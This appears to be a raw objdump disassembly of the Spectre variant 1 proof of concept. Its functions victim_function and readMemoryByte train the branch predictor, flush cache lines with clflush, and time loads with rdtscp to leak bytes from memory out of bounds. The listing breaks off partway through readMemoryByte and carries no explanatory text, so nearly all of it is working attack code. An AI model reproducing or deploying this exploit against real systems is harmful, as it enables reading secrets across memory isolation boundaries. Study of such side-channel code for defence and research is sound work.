000000000040099e <victim_function>:
  40099e:	55                   	push   %rbp
  40099f:	48 89 e5             	mov    %rsp,%rbp
  4009a2:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  4009a6:	8b 05 e4 a6 2c 00    	mov    0x2ca6e4(%rip),%eax        # 6cb090 <array1_size>
  4009ac:	89 c0                	mov    %eax,%eax
  4009ae:	48 3b 45 f8          	cmp    -0x8(%rbp),%rax
  4009b2:	76 2b                	jbe    4009df <victim_function+0x41>
  4009b4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4009b8:	48 05 a0 b0 6c 00    	add    $0x6cb0a0,%rax
  4009be:	0f b6 00             	movzbl (%rax),%eax
  4009c1:	0f b6 c0             	movzbl %al,%eax
  4009c4:	c1 e0 09             	shl    $0x9,%eax
  4009c7:	48 98                	cltq   
  4009c9:	0f b6 90 e0 e1 6c 00 	movzbl 0x6ce1e0(%rax),%edx
  4009d0:	0f b6 05 09 c2 2c 00 	movzbl 0x2cc209(%rip),%eax        # 6ccbe0 <temp>
  4009d7:	21 d0                	and    %edx,%eax
  4009d9:	88 05 01 c2 2c 00    	mov    %al,0x2cc201(%rip)        # 6ccbe0 <temp>
  4009df:	5d                   	pop    %rbp
  4009e0:	c3                   	ret    

00000000004009e1 <readMemoryByte>:
  4009e1:	55                   	push   %rbp
  4009e2:	48 89 e5             	mov    %rsp,%rbp
  4009e5:	53                   	push   %rbx
  4009e6:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  4009ea:	89 7d 94             	mov    %edi,-0x6c(%rbp)
  4009ed:	48 89 75 88          	mov    %rsi,-0x78(%rbp)
  4009f1:	48 89 55 80          	mov    %rdx,-0x80(%rbp)
  4009f5:	48 89 8d 78 ff ff ff 	mov    %rcx,-0x88(%rbp)
  4009fc:	c7 45 a4 00 00 00 00 	movl   $0x0,-0x5c(%rbp)
  400a03:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%rbp)
  400a0a:	eb 14                	jmp    400a20 <readMemoryByte+0x3f>
  400a0c:	8b 45 b0             	mov    -0x50(%rbp),%eax
  400a0f:	48 98                	cltq   
  400a11:	c7 04 85 00 cc 6c 00 	movl   $0x0,0x6ccc00(,%rax,4)
  400a18:	00 00 00 00 
  400a1c:	83 45 b0 01          	addl   $0x1,-0x50(%rbp)
  400a20:	81 7d b0 ff 00 00 00 	cmpl   $0xff,-0x50(%rbp)
  400a27:	7e e3                	jle    400a0c <readMemoryByte+0x2b>
  400a29:	c7 45 ac e7 03 00 00 	movl   $0x3e7,-0x54(%rbp)
  400a30:	e9 78 02 00 00       	jmp    400cad <readMemoryByte+0x2cc>
  400a35:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%rbp)
  400a3c:	eb 1d                	jmp    400a5b <readMemoryByte+0x7a>
  400a3e:	8b 45 b0             	mov    -0x50(%rbp),%eax
  400a41:	c1 e0 09             	shl    $0x9,%eax
  400a44:	48 98                	cltq   
  400a46:	48 05 e0 e1 6c 00    	add    $0x6ce1e0,%rax
  400a4c:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  400a50:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  400a54:	0f ae 38             	clflush (%rax)
  400a57:	83 45 b0 01          	addl   $0x1,-0x50(%rbp)
  400a5b:	81 7d b0 ff 00 00 00 	cmpl   $0xff,-0x50(%rbp)
  400a62:	7e da                	jle    400a3e <readMemoryByte+0x5d>
  400a64:	8b 45 ac             	mov    -0x54(%rbp),%eax
  400a67:	8b 0d 23 a6 2c 00    	mov    0x2ca623(%rip),%ecx        # 6cb090 <array1_size>
  400a6d:	ba 00 00 00 00       	mov    $0x0,%edx
  400a72:	f7 f1                	div    %ecx
  400a74:	89 d0                	mov    %edx,%eax
  400a76:	89 c0                	mov    %eax,%eax
  400a78:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  400a7c:	c7 45 b4 1d 00 00 00 	movl   $0x1d,-0x4c(%rbp)
  400a83:	e9 88 00 00 00       	jmp    400b10 <readMemoryByte+0x12f>
  400a88:	48 c7 45 e0 90 b0 6c 	movq   $0x6cb090,-0x20(%rbp)
  400a8f:	00 
  400a90:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  400a94:	0f ae 38             	clflush (%rax)
  400a97:	c7 45 a8 00 00 00 00 	movl   $0x0,-0x58(%rbp)
  400a9e:	eb 09                	jmp    400aa9 <readMemoryByte+0xc8>
  400aa0:	8b 45 a8             	mov    -0x58(%rbp),%eax
  400aa3:	83 c0 01             	add    $0x1,%eax
  400aa6:	89 45 a8             	mov    %eax,-0x58(%rbp)
  400aa9:	8b 45 a8             	mov    -0x58(%rbp),%eax
  400aac:	83 f8 63             	cmp    $0x63,%eax
  400aaf:	7e ef                	jle    400aa0 <readMemoryByte+0xbf>
  400ab1:	8b 4d b4             	mov    -0x4c(%rbp),%ecx
  400ab4:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
  400ab9:	89 c8                	mov    %ecx,%eax
  400abb:	f7 ea                	imul   %edx
  400abd:	89 c8                	mov    %ecx,%eax
  400abf:	c1 f8 1f             	sar    $0x1f,%eax
  400ac2:	29 c2                	sub    %eax,%edx
  400ac4:	89 d0                	mov    %edx,%eax
  400ac6:	01 c0                	add    %eax,%eax
  400ac8:	01 d0                	add    %edx,%eax
  400aca:	01 c0                	add    %eax,%eax
  400acc:	29 c1                	sub    %eax,%ecx
  400ace:	89 ca                	mov    %ecx,%edx
  400ad0:	8d 42 ff             	lea    -0x1(%rdx),%eax
  400ad3:	66 b8 00 00          	mov    $0x0,%ax
  400ad7:	48 98                	cltq   
  400ad9:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  400add:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  400ae1:	48 c1 e8 10          	shr    $0x10,%rax
  400ae5:	48 09 45 c8          	or     %rax,-0x38(%rbp)
  400ae9:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  400aed:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
  400af1:	48 31 d0             	xor    %rdx,%rax
  400af4:	48 23 45 c8          	and    -0x38(%rbp),%rax
  400af8:	48 33 45 c0          	xor    -0x40(%rbp),%rax
  400afc:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  400b00:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  400b04:	48 89 c7             	mov    %rax,%rdi
  400b07:	e8 92 fe ff ff       	call   40099e <victim_function>
  400b0c:	83 6d b4 01          	subl   $0x1,-0x4c(%rbp)
  400b10:	83 7d b4 00          	cmpl   $0x0,-0x4c(%rbp)
  400b14:	0f 89 6e ff ff ff    	jns    400a88 <readMemoryByte+0xa7>
  400b1a:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%rbp)
  400b21:	e9 b9 00 00 00       	jmp    400bdf <readMemoryByte+0x1fe>
  400b26:	8b 45 b0             	mov    -0x50(%rbp),%eax
  400b29:	69 c0 a7 00 00 00    	imul   $0xa7,%eax,%eax
  400b2f:	83 c0 0d             	add    $0xd,%eax
  400b32:	25 ff 00 00 00       	and    $0xff,%eax
  400b37:	89 45 bc             	mov    %eax,-0x44(%rbp)
  400b3a:	8b 45 bc             	mov    -0x44(%rbp),%eax
  400b3d:	c1 e0 09             	shl    $0x9,%eax
  400b40:	48 98                	cltq   
  400b42:	48 05 e0 e1 6c 00    	add    $0x6ce1e0,%rax
  400b48:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  400b4c:	48 8d 45 a4          	lea    -0x5c(%rbp),%rax
  400b50:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  400b54:	0f 01 f9             	rdtscp 
  400b57:	89 ce                	mov    %ecx,%esi
  400b59:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
  400b5d:	89 31                	mov    %esi,(%rcx)
  400b5f:	48 c1 e2 20          	shl    $0x20,%rdx
  400b63:	48 09 d0             	or     %rdx,%rax
  400b66:	48 89 c3             	mov    %rax,%rbx
  400b69:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  400b6d:	0f b6 00             	movzbl (%rax),%eax
  400b70:	0f b6 c0             	movzbl %al,%eax
  400b73:	89 45 a4             	mov    %eax,-0x5c(%rbp)
  400b76:	48 8d 45 a4          	lea    -0x5c(%rbp),%rax
  400b7a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  400b7e:	0f 01 f9             	rdtscp 
  400b81:	89 ce                	mov    %ecx,%esi
  400b83:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
  400b87:	89 31                	mov    %esi,(%rcx)
  400b89:	48 c1 e2 20          	shl    $0x20,%rdx
  400b8d:	48 09 d0             	or     %rdx,%rax
  400b90:	48 29 d8             	sub    %rbx,%rax
  400b93:	48 89 c3             	mov    %rax,%rbx
  400b96:	89 d8                	mov    %ebx,%eax
  400b98:	3b 45 94             	cmp    -0x6c(%rbp),%eax
  400b9b:	7f 3e                	jg     400bdb <readMemoryByte+0x1fa>
  400b9d:	8b 45 ac             	mov    -0x54(%rbp),%eax
  400ba0:	8b 0d ea a4 2c 00    	mov    0x2ca4ea(%rip),%ecx        # 6cb090 <array1_size>
  400ba6:	ba 00 00 00 00       	mov    $0x0,%edx
  400bab:	f7 f1                	div    %ecx
  400bad:	89 d0                	mov    %edx,%eax
  400baf:	89 c0                	mov    %eax,%eax
  400bb1:	0f b6 80 a0 b0 6c 00 	movzbl 0x6cb0a0(%rax),%eax
  400bb8:	0f b6 c0             	movzbl %al,%eax
  400bbb:	3b 45 bc             	cmp    -0x44(%rbp),%eax
  400bbe:	74 1b                	je     400bdb <readMemoryByte+0x1fa>
  400bc0:	8b 45 bc             	mov    -0x44(%rbp),%eax
  400bc3:	48 98                	cltq   
  400bc5:	8b 04 85 00 cc 6c 00 	mov    0x6ccc00(,%rax,4),%eax
  400bcc:	8d 50 01             	lea    0x1(%rax),%edx
  400bcf:	8b 45 bc             	mov    -0x44(%rbp),%eax
  400bd2:	48 98                	cltq   
  400bd4:	89 14 85 00 cc 6c 00 	mov    %edx,0x6ccc00(,%rax,4)
  400bdb:	83 45 b0 01          	addl   $0x1,-0x50(%rbp)
  400bdf:	81 7d b0 ff 00 00 00 	cmpl   $0xff,-0x50(%rbp)
  400be6:	0f 8e 3a ff ff ff    	jle    400b26 <readMemoryByte+0x145>
  400bec:	c7 45 b8 ff ff ff ff 	movl   $0xffffffff,-0x48(%rbp)
  400bf3:	8b 45 b8             	mov    -0x48(%rbp),%eax
  400bf6:	89 45 b4             	mov    %eax,-0x4c(%rbp)
  400bf9:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%rbp)
  400c00:	eb 5c                	jmp    400c5e <readMemoryByte+0x27d>
  400c02:	83 7d b4 00          	cmpl   $0x0,-0x4c(%rbp)
  400c06:	78 1c                	js     400c24 <readMemoryByte+0x243>
  400c08:	8b 45 b0             	mov    -0x50(%rbp),%eax
  400c0b:	48 98                	cltq   
  400c0d:	8b 14 85 00 cc 6c 00 	mov    0x6ccc00(,%rax,4),%edx
  400c14:	8b 45 b4             	mov    -0x4c(%rbp),%eax
  400c17:	48 98                	cltq   
  400c19:	8b 04 85 00 cc 6c 00 	mov    0x6ccc00(,%rax,4),%eax
  400c20:	39 c2                	cmp    %eax,%edx
  400c22:	7c 0e                	jl     400c32 <readMemoryByte+0x251>
  400c24:	8b 45 b4             	mov    -0x4c(%rbp),%eax
  400c27:	89 45 b8             	mov    %eax,-0x48(%rbp)
  400c2a:	8b 45 b0             	mov    -0x50(%rbp),%eax
  400c2d:	89 45 b4             	mov    %eax,-0x4c(%rbp)
  400c30:	eb 28                	jmp    400c5a <readMemoryByte+0x279>
  400c32:	83 7d b8 00          	cmpl   $0x0,-0x48(%rbp)
  400c36:	78 1c                	js     400c54 <readMemoryByte+0x273>
  400c38:	8b 45 b0             	mov    -0x50(%rbp),%eax
  400c3b:	48 98                	cltq   
  400c3d:	8b 14 85 00 cc 6c 00 	mov    0x6ccc00(,%rax,4),%edx
  400c44:	8b 45 b8             	mov    -0x48(%rbp),%eax
  400c47:	48 98                	cltq   
  400c49:	8b 04 85 00 cc 6c 00 	mov    0x6ccc00(,%rax,4),%eax
  400c50:	39 c2                	cmp    %eax,%edx
  400c52:	7c 06                	jl     400c5a <readMemoryByte+0x279>
  400c54:	8b 45 b0             	mov    -0x50(%rbp),%eax
  400c57:	89 45 b8             	mov    %eax,-0x48(%rbp)
  400c5a:	83 45 b0 01          	addl   $0x1,-0x50(%rbp)
  400c5e:	81 7d b0 ff 00 00 00 	cmpl   $0xff,-0x50(%rbp)
  400c65:	7e 9b                	jle    400c02 <readMemoryByte+0x221>
  400c67:	8b 45 b4             	mov    -0x4c(%rbp),%eax
  400c6a:	48 98                	cltq   
  400c6c:	8b 14 85 00 cc 6c 00 	mov    0x6ccc00(,%rax,4),%edx
  400c73:	8b 45 b8             	mov    -0x48(%rbp),%eax
